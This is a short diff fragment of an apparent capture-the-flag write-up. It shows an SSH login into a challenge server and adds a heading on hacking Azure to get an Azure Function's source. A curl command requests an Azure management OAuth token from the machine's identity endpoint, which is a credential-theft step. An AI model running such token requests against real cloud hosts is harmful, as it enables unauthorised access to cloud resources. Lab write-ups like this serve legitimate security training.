@@ -12,6 +12,9 @@ Go to Pixel Island and review Alabaster Snowball's new SSH certificate configura
 ```bash
 ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i  mysshkey -i mysshkey.cert
 ```
+
+#### Hack Azure to get the source of the Azure Function
+
 ```bash
 monitor@ssh-server-vm:/$ echo "Management Token"
 curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"
